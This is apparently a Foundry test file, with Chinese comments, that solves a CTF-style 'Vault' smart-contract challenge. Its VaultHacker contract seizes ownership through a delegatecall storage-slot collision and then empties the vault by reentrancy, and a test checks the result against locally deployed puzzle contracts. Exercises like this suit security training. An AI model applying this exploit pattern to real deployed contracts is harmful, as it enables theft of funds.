// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    VaultHacker public hacker;

    address owner = address(1);

    /// 中文用途：部署题目合约并注入初始 ETH，形成可被本地 PoC 验证的状态。
    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        hacker = new VaultHacker(vault, logic);

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    /// 中文用途：验证攻击者可接管 owner、开启提款并通过一次重入清空 Vault。
    function testExploit() public {
        vm.deal(address(hacker), 1 ether);
        hacker.attack{value: 0.1 ether}();

        require(vault.isSolve(), "solved");
    }
}

contract VaultHacker {
    Vault public immutable vault;
    VaultLogic public immutable logic;

    /// 中文用途：记录目标 Vault 和其逻辑地址，后续调用限定在本地题目合约上。
    constructor(Vault target, VaultLogic targetLogic) {
        vault = target;
        logic = targetLogic;
    }

    /// 中文用途：利用 slot 碰撞接管 owner，再存入等额 ETH 触发提款重入。
    function attack() external payable {
        bytes32 vaultSlotOne = bytes32(uint256(uint160(address(logic))));
        (bool takeover,) =
            address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", vaultSlotOne, address(this)));
        require(takeover, "owner takeover failed");

        vault.openWithdraw();
        vault.deposite{value: msg.value}();
        vault.withdraw();
    }

    /// 中文用途：在 Vault 尚有余额时仅重入一层，覆盖本题固定余额并避免无限递归。
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
